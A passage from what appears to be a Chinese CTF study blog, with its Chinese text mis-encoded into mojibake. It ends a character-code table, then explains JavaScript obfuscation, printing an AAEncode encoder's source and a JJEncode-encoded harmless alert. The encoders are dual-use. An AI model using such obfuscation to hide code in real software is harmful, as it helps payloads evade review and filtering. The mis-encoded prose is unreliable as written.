A</td></tr><tr><td>193</td><td>C1</td><td>Ã</td><td>å¸¦å°–é”é‡éŸ³çš„å¤§å†™å­—æ¯ A</td></tr><tr><td>194</td><td>C2</td><td>Ã‚</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å¤§å†™å­—æ¯ A</td></tr><tr><td>195</td><td>C3</td><td>Ãƒ</td><td>å¸¦ä»£å­—å·çš„å¤§å†™å­—æ¯ A</td></tr><tr><td>196</td><td>C4</td><td>Ã„</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ A</td></tr><tr><td>197</td><td>C5</td><td>Ã…</td><td>å¸¦é“ƒå£°çš„å¤§å†™å­—æ¯ A</td></tr><tr><td>198</td><td>C6</td><td>Ã†</td><td>å¤§å†™å­—æ¯ AE åŒé‡å…ƒéŸ³</td></tr><tr><td>199</td><td>C7</td><td>Ã‡</td><td>å¸¦å˜éŸ³ç¬¦å·çš„å¤§å†™å­—æ¯ C</td></tr><tr><td>200</td><td>C8</td><td>Ãˆ</td><td>å¸¦é‡éŸ³ç¬¦çš„å¤§å†™å­—æ¯ E</td></tr><tr><td>201</td><td>C9</td><td>Ã‰</td><td>å¸¦å°–é”é‡éŸ³çš„å¤§å†™å­—æ¯ E</td></tr><tr><td>202</td><td>CA</td><td>ÃŠ</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å¤§å†™å­—æ¯ E</td></tr><tr><td>203</td><td>CB</td><td>Ã‹</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ E</td></tr><tr><td>204</td><td>CC</td><td>ÃŒ</td><td>å¸¦é‡éŸ³ç¬¦çš„å¤§å†™å­—æ¯ I</td></tr><tr><td>205</td><td>CD</td><td>Ã</td><td>å¸¦å°–é”é‡éŸ³çš„å¤§å†™å­—æ¯ I</td></tr><tr><td>206</td><td>CE</td><td>Ã</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å¤§å†™å­—æ¯ I</td></tr><tr><td>207</td><td>CF</td><td>Ã</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ I</td></tr><tr><td>208</td><td>D0</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>209</td><td>D1</td><td>Ã‘</td><td>å¸¦ä»£å­—å·çš„å¤§å†™å­—æ¯ N</td></tr><tr><td>210</td><td>D2</td><td>Ã’</td><td>å¸¦é‡éŸ³ç¬¦çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>211</td><td>D3</td><td>Ã“</td><td>å¸¦å°–é”é‡éŸ³çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>212</td><td>D4</td><td>Ã”</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>213</td><td>D5</td><td>Ã•</td><td>å¸¦ä»£å­—å·çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>214</td><td>D6</td><td>Ã–</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>215</td><td>D7</td><td>OE</td><td>å¤§å†™å­—æ¯ OE è¿å­— 2</td></tr><tr><td>216</td><td>D8</td><td>Ã˜</td><td>å¸¦æ–œæ çš„å¤§å†™å­—æ¯ O</td></tr><tr><td>217</td><td>D9</td><td>Ã™</td><td>å¸¦é‡éŸ³ç¬¦çš„å¤§å†™å­—æ¯ U</td></tr><tr><td>218</td><td>DA</td><td>Ãš</td><td>å¸¦å°–é”é‡éŸ³çš„å¤§å†™å­—æ¯ U</td></tr><tr><td>219</td><td>DB</td><td>Ã›</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å¤§å†™å­—æ¯ U</td></tr><tr><td>220</td><td>DC</td><td>Ãœ</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ U</td></tr><tr><td>221</td><td>DD</td><td>Y</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å¤§å†™å­—æ¯ Y</td></tr><tr><td>222</td><td>DE</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>223</td><td>DF</td><td>ÃŸ</td><td>å¾·è¯­é«˜è°ƒå°å†™å­—æ¯ s</td></tr><tr><td>224</td><td>E0</td><td>Ã </td><td>å¸¦é‡éŸ³ç¬¦çš„å°å†™å­—æ¯ a</td></tr><tr><td>225</td><td>E1</td><td>Ã¡</td><td>å¸¦å°–é”é‡éŸ³çš„å°å†™å­—æ¯ a</td></tr><tr><td>226</td><td>E2</td><td>Ã¢</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å°å†™å­—æ¯ a</td></tr><tr><td>227</td><td>E3</td><td>Ã£</td><td>å¸¦ä»£å­—å·çš„å°å†™å­—æ¯ a</td></tr><tr><td>228</td><td>E4</td><td>Ã¤</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ a</td></tr><tr><td>229</td><td>E5</td><td>Ã¥</td><td>å¸¦é“ƒå£°çš„å°å†™å­—æ¯ a</td></tr><tr><td>230</td><td>E6</td><td>Ã¦</td><td>å°å†™å­—æ¯ ae åŒé‡å…ƒéŸ³</td></tr><tr><td>231</td><td>E7</td><td>Ã§</td><td>å¸¦å˜éŸ³ç¬¦å·çš„å°å†™å­—æ¯ c</td></tr><tr><td>232</td><td>E8</td><td>Ã¨</td><td>å¸¦é‡éŸ³ç¬¦çš„å°å†™å­—æ¯ e</td></tr><tr><td>233</td><td>E9</td><td>Ã©</td><td>å¸¦å°–é”é‡éŸ³çš„å°å†™å­—æ¯ e</td></tr><tr><td>234</td><td>EA</td><td>Ãª</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å°å†™å­—æ¯ e</td></tr><tr><td>235</td><td>EB</td><td>Ã«</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ e</td></tr><tr><td>236</td><td>EC</td><td>Ã¬</td><td>å¸¦é‡éŸ³ç¬¦çš„å°å†™å­—æ¯ i</td></tr><tr><td>237</td><td>ED</td><td>Ã­</td><td>å¸¦å°–é”é‡éŸ³çš„å°å†™å­—æ¯ i</td></tr><tr><td>238</td><td>EE</td><td>Ã®</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å°å†™å­—æ¯ i</td></tr><tr><td>239</td><td>EF</td><td>Ã¯</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ i</td></tr><tr><td>240</td><td>F0</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>241</td><td>F1</td><td>Ã±</td><td>å¸¦ä»£å­—å·çš„å°å†™å­—æ¯ n</td></tr><tr><td>242</td><td>F2</td><td>Ã²</td><td>å¸¦é‡éŸ³ç¬¦çš„å°å†™å­—æ¯ o</td></tr><tr><td>243</td><td>F3</td><td>Ã³</td><td>å¸¦å°–é”é‡éŸ³çš„å°å†™å­—æ¯ o</td></tr><tr><td>244</td><td>F4</td><td>Ã´</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å°å†™å­—æ¯ o</td></tr><tr><td>245</td><td>F5</td><td>Ãµ</td><td>å¸¦ä»£å­—å·çš„å°å†™å­—æ¯ o</td></tr><tr><td>246</td><td>F6</td><td>Ã¶</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ o</td></tr><tr><td>247</td><td>F7</td><td>oe</td><td>å°å†™å­—æ¯ oe è¿å­— 2</td></tr><tr><td>248</td><td>F8</td><td>Ã¸</td><td>å¸¦æ–œæ çš„å°å†™å­—æ¯ o</td></tr><tr><td>249</td><td>F9</td><td>Ã¹</td><td>å¸¦é‡éŸ³ç¬¦çš„å°å†™å­—æ¯ u</td></tr><tr><td>250</td><td>FA</td><td>Ãº</td><td>å¸¦å°–é”é‡éŸ³çš„å°å†™å­—æ¯ u</td></tr><tr><td>251</td><td>FB</td><td>Ã»</td><td>å¸¦éŸ³è°ƒç¬¦å·çš„å°å†™å­—æ¯ u</td></tr><tr><td>252</td><td>FC</td><td>Ã¼</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ u</td></tr><tr><td>253</td><td>FD</td><td>Ã¿</td><td>å¸¦å…ƒéŸ³å˜éŸ³ (åˆ†éŸ³ç¬¦å·) çš„å°å†™å­—æ¯ y 2</td></tr><tr><td>254</td><td>FE</td><td></td><td>[ä¿ç•™] 2</td></tr><tr><td>255</td><td>FF</td><td></td><td>[ä¿ç•™] 2</td></tr></tbody></table></div><h3 id="9ã€JSä»£ç æ··æ·†"><a href="#9ã€JSä»£ç æ··æ·†" class="headerlink" title="9ã€JSä»£ç æ··æ·†"></a>9ã€JSä»£ç æ··æ·†</h3><p><a href="https://examine2.top/2020/02/12/JSä»£ç æ··æ·†/">JSä»£ç æ··æ·† | examine2â€™s Blog</a></p><h4 id="1ï¼‰AAEncode"><a href="#1ï¼‰AAEncode" class="headerlink" title="1ï¼‰AAEncode"></a>1ï¼‰AAEncode</h4><p>ä»€ä¹ˆæ˜¯AAEncodeï¼Ÿ å°±æ˜¯å°†JavaScriptä»£ç è½¬æ¢æˆé¢œæ–‡å­—ç½‘ç»œè¡¨æƒ…çš„ç¼–ç ã€‚</p><p>ç»è¿‡aaencodeæ··æ·†çš„JSä»£ç ååˆ†æ˜¾çœ¼ï¼Œé€šç¯‡ä»£ç å‘ˆç° <code>(ï¾ŸĞ”ï¾Ÿ)(ï¾Ÿoï¾Ÿ)(ï¾ŸÎ˜ï¾Ÿ)</code> ä¹‹ç±»çš„é¢œæ–‡å­—ï¼Œç›¸å½“å¯çˆ±ã€‚</p><p><strong>åœ¨çº¿è§£å¯†ï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/109a4bf02dd139a0432ac65efb29fc71.png" alt="1"></p><p><strong>ç›´æ¥è¿è¡Œï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/01da495f776f5048b76eee04c6f1fab5.png" alt="3"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/08b33b7b0ab51060b426577f38e9a6fb.png" alt="2"></p><p><strong>æºç ï¼š</strong></p><pre><code>function aaencode( text )&#123;    var t;    var b = [        &quot;(c^_^o)&quot;,        &quot;(ï¾ŸÎ˜ï¾Ÿ)&quot;,        &quot;((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))&quot;,        &quot;(o^_^o)&quot;,        &quot;(ï¾Ÿï½°ï¾Ÿ)&quot;,        &quot;((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))&quot;,        &quot;((o^_^o) +(o^_^o))&quot;,        &quot;((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))&quot;,        &quot;((ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ))&quot;,        &quot;((ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) .ï¾ŸÏ‰ï¾Ÿï¾‰&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) .ï¾ŸÎ˜ï¾Ÿï¾‰&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) [&#39;c&#39;]&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) .ï¾Ÿï½°ï¾Ÿï¾‰&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) .ï¾ŸĞ”ï¾Ÿï¾‰&quot;,        &quot;(ï¾ŸĞ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ]&quot;        ];    var r = &quot;ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”»   //*Â´âˆ‡ï½€*/ [&#39;_&#39;]; o=(ï¾Ÿï½°ï¾Ÿ)  =_=3; c=(ï¾ŸÎ˜ï¾Ÿ) =(ï¾Ÿï½°ï¾Ÿ)-(ï¾Ÿï½°ï¾Ÿ); &quot;;     if( /ã²ã ã¾ã‚Šã‚¹ã‚±ãƒƒãƒÃ—(365|ï¼“ï¼•ï¼–)\s*æ¥é€±ã‚‚è¦‹ã¦ãã ã•ã„ã­[!ï¼]/.test( text ) )&#123;        r += &quot;X=_=3; &quot;;        r += &quot;\r\n\r\n    X / _ / X &lt; \&quot;æ¥é€±ã‚‚è¦‹ã¦ãã ã•ã„ã­!\&quot;;\r\n\r\n&quot;;    &#125;    r += &quot;(ï¾ŸĞ”ï¾Ÿ) =(ï¾ŸÎ˜ï¾Ÿ)= (o^_^o)/ (o^_^o);&quot;+        &quot;(ï¾ŸĞ”ï¾Ÿ)=&#123;ï¾ŸÎ˜ï¾Ÿ: &#39;_&#39; ,ï¾ŸÏ‰ï¾Ÿï¾‰ : ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ] &quot;+        &quot;,ï¾Ÿï½°ï¾Ÿï¾‰ :(ï¾ŸÏ‰ï¾Ÿï¾‰+ &#39;_&#39;)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)] &quot;+        &quot;,ï¾ŸĞ”ï¾Ÿï¾‰:((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;)[ï¾Ÿï½°ï¾Ÿ] &#125;; (ï¾ŸĞ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ] =((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [c^_^o];&quot;+        &quot;(ï¾ŸĞ”ï¾Ÿ) [&#39;c&#39;] = ((ï¾ŸĞ”ï¾Ÿ)+&#39;_&#39;) [ (ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)-(ï¾ŸÎ˜ï¾Ÿ) ];&quot;+        &quot;(ï¾ŸĞ”ï¾Ÿ) [&#39;o&#39;] = ((ï¾ŸĞ”ï¾Ÿ)+&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ];&quot;+        &quot;(ï¾Ÿoï¾Ÿ)=(ï¾ŸĞ”ï¾Ÿ) [&#39;c&#39;]+(ï¾ŸĞ”ï¾Ÿ) [&#39;o&#39;]+(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;)[ï¾ŸÎ˜ï¾Ÿ]+ ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [ï¾Ÿï½°ï¾Ÿ] + &quot;+        &quot;((ï¾ŸĞ”ï¾Ÿ) +&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ ((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+&quot;+        &quot;((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ) - (ï¾ŸÎ˜ï¾Ÿ)]+(ï¾ŸĞ”ï¾Ÿ) [&#39;c&#39;]+&quot;+        &quot;((ï¾ŸĞ”ï¾Ÿ)+&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ (ï¾ŸĞ”ï¾Ÿ) [&#39;o&#39;]+&quot;+        &quot;((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ];(ï¾ŸĞ”ï¾Ÿ) [&#39;_&#39;] =(o^_^o) [ï¾Ÿoï¾Ÿ] [ï¾Ÿoï¾Ÿ];&quot;+        &quot;(ï¾ŸÎµï¾Ÿ)=((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ) .ï¾ŸĞ”ï¾Ÿï¾‰+&quot;+        &quot;((ï¾ŸĞ”ï¾Ÿ)+&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ)]+((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [o^_^o -ï¾ŸÎ˜ï¾Ÿ]+&quot;+        &quot;((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]; &quot;+        &quot;(ï¾Ÿï½°ï¾Ÿ)+=(ï¾ŸÎ˜ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]=&#39;\\\\&#39;; &quot;+        &quot;(ï¾ŸĞ”ï¾Ÿ).ï¾ŸÎ˜ï¾Ÿï¾‰=(ï¾ŸĞ”ï¾Ÿ+ ï¾Ÿï½°ï¾Ÿ)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)];&quot;+         &quot;(oï¾Ÿï½°ï¾Ÿo)=(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;)[c^_^o];&quot;+//TODO        &quot;(ï¾ŸĞ”ï¾Ÿ) [ï¾Ÿoï¾Ÿ]=&#39;\\\&quot;&#39;;&quot;+         &quot;(ï¾ŸĞ”ï¾Ÿ) [&#39;_&#39;] ( (ï¾ŸĞ”ï¾Ÿ) [&#39;_&#39;] (ï¾ŸÎµï¾Ÿ+&quot;;    r += &quot;(ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]+ &quot;;    for( var i = 0; i &lt; text.length; i++ )&#123;        n = text.charCodeAt( i );        t = &quot;(ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+&quot;;        if( n &lt;= 127 )&#123;            t += n.toString( 8 ).replace( /[0-7]/g, function(c)&#123; return b[ c ] + &quot;+ &quot;; &#125; );        &#125;else&#123;            var m = /[0-9a-f]&#123;4&#125;$/.exec( &quot;000&quot; + n.toString(16 ) )[0];            t += &quot;(oï¾Ÿï½°ï¾Ÿo)+ &quot; + m.replace( /[0-9a-f]/gi, function(c)&#123; return b[ parseInt( c,16 ) ] + &quot;+ &quot;; &#125; );        &#125;        r += t;    &#125;    r += &quot;(ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]) (ï¾ŸÎ˜ï¾Ÿ)) (&#39;_&#39;);&quot;;    return r;&#125;</code></pre><h4 id="2ï¼‰JSFUCK"><a href="#2ï¼‰JSFUCK" class="headerlink" title="2ï¼‰JSFUCK"></a>2ï¼‰JSFUCK</h4><p>æ—¥æœ¬å®‰å…¨ç ”ç©¶äººå‘˜<code>é•¿è°·å·é˜³ä»‹</code>åˆ¶ä½œäº†åä¸º<code>JSF*ck</code>çš„ç¼–ç å™¨ï¼Œèƒ½å¤Ÿå°†æ‰€æœ‰JSä»£ç ç”¨6ä¸ªå­—ç¬¦ï¼ˆåˆ†åˆ«æ˜¯<strong><code>[</code>ã€<code>]</code>ã€<code>(</code>ã€<code>)</code>ã€<code>!</code>ã€<code>+</code></strong>ï¼‰æ¥è¡¨ç¤ºï¼ˆç§°ä¹‹ä¸º<strong>ç”¨6ä¸ªå­—ç¬¦æ¥æ··æ·†JavaScript</strong>ï¼‰ã€‚</p><h4 id="3ï¼‰JJEncode"><a href="#3ï¼‰JJEncode" class="headerlink" title="3ï¼‰JJEncode"></a>3ï¼‰JJEncode</h4><p>jjencodeåŒæ ·åˆ<code>é•¿è°·å·é˜³ä»‹</code>å…ˆç”Ÿåˆ›å»ºï¼Œåªæ˜¯ä¸JSFuckçš„åˆ›å»ºæ—¶é—´ä¸åŒ</p><p>jjencodeåˆ›å»ºäº2009å¹´7æœˆï¼ŒJSFuckåˆ™æ˜¯2010å¹´åº•ï¼›jjencodeå…ˆäºJSFuckï¼Œè€Œåœ¨æ··æ·†èƒ½åŠ›ä¸Šï¼Œjjencodeå¼±äºJSFuckâ€”â€”jjencodeå°†JSä»£ç æ··æ·†ä¸º<strong><code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code> è¿™18ä¸ªå­—ç¬¦çš„æ’åˆ—ç»„åˆ</strong></p><p>å¯ä»¥è¯´jjencodeæ˜¯JSFuckçš„æ—©æœŸå¼±åŒ–ç‰ˆæœ¬</p><blockquote><p>Perlè¯­è¨€æœ‰ppencodeæ··æ·†ã€Rubyè¯­è¨€æœ‰rrencodeï¼Œæ‰€ä»¥ä»jjencodeçš„å‘½åä¹Ÿèƒ½çœ‹å‡ºè¿™æ˜¯æœ€åˆçš„JSæ··æ·†</p></blockquote><p>å°†ä»»ä½•åˆæ³•çš„JavaScriptä»£ç è¿›è¡Œç¼–ç ã€‚ç¼–ç åçš„JSä»£ç ä»…ç”±ç¬¦å·ç»„æˆçš„ã€‚</p><p>ç¼–ç å‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">alert(<span class="hljs-string">&quot;Hello, JavaScript&quot;</span> )<br></code></pre></td></tr></table></figure><p>ç¼–ç åï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span>=~[];<span class="hljs-variable">$</span>=&#123;___:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],__<span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$_:</span>(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],_<span class="hljs-variable">$_:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>:(<span class="hljs-variable">$</span>[<span class="hljs-variable">$</span>]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],_<span class="hljs-variable">$</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_:</span>(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$__:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$__:</span>(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$</span><span class="hljs-variable">$_:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$___:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$__</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>&#125;;<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>=(<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>=<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>]+(<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>=<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>=(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+((!<span class="hljs-variable">$</span>)+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>]+(<span class="hljs-variable">$</span>.__=<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>])+(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+(<span class="hljs-variable">$</span>._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>])+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>]+<span class="hljs-variable">$</span>.__+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>;<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>=<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>]+<span class="hljs-variable">$</span>.__+<span class="hljs-variable">$</span>._+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>;<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>=(<span class="hljs-variable">$</span>.___)[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span>][<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span>];<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>+<span class="hljs-string">&quot;\&quot;</span><span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+(![]+&quot;</span><span class="hljs-string">&quot;)[<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>]+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+&quot;</span>\\<span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.__+&quot;</span>(\\\<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>]+(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>]+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;,\\&quot;</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$__</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span><span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$__</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span 